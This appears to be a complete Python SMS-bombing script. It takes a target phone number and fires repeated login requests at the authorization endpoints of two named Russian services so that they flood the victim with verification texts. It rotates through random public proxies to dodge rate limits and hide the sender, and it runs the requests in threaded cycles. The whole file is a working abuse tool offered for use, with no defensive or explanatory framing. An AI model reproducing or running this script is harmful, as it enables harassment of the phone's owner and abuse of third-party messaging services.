import requests
import time
import argparse
import random
from concurrent.futures import ThreadPoolExecutor

WORKING_APIS = {
    "DNS": {
        "url": "https://www.dns-shop.ru/auth/auth/fast-authorization/",
        "method": "POST",
        "data": {"phone": "{phone}"}
    },
    "Utair": {
        "url": "https://b.utair.ru/api/v1/login/",
        "method": "POST",
        "data": {"login": "{phone}"}
    }
}

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Accept": "application/json, text/plain, */*"
}

def get_proxies():
    print("[*] Fetching fresh proxies...")
    try:
        url = "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt"
        response = requests.get(url, timeout=10)
        proxies_list = [p for p in response.text.splitlines() if p.strip()]
        print(f"[*] Loaded {len(proxies_list)} proxies.")
        return proxies_list
    except Exception as e:
        print(f"[!] Failed to fetch proxies: {e}")
        return []

PROXY_POOL = get_proxies()

def send_sms(service_name, api_data, phone):
    try:
        url = api_data["url"]
        data = {}
        for k, v in api_data.get("data", {}).items():
            data[k] = v.replace("{phone}", phone) if isinstance(v, str) else v

        proxy = None
        proxy_str = "None"
        if PROXY_POOL:
            p = random.choice(PROXY_POOL)
            proxy_str = p
            proxy = {"http": f"http://{p}", "https": f"http://{p}"}

        r = requests.post(url, data=data, headers=HEADERS, proxies=proxy, timeout=6)
        
        if r.status_code in [200, 201, 204]:
            print(f"[+] OK: {service_name} ({r.status_code}) | Proxy: {proxy_str}")
        else:
            print(f"[-] FAIL: {service_name} ({r.status_code})")
            
    except Exception as e:
        print(f"[!] ERR: {service_name} - {type(e).__name__}")

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-p", "--phone", required=True)
    parser.add_argument("-c", "--count", type=int, default=1)
    args = parser.parse_args()

    phone = args.phone
    print(f"[*] Target: {phone}")
    print(f"[*] APIs: {len(WORKING_APIS)}")
    print(f"[*] Cycles: {args.count}\n")

    try:
        for i in range(args.count):
            print(f"--- Cycle {i+1} ---")
            with ThreadPoolExecutor(max_workers=len(WORKING_APIS)) as executor:
                for name, api_data in WORKING_APIS.items():
                    executor.submit(send_sms, name, api_data, phone)
            
            if i < args.count - 1:
                time.sleep(3)
                
    except KeyboardInterrupt:
        print("\n[*] Stopped.")

if __name__ == "__main__":
    main()
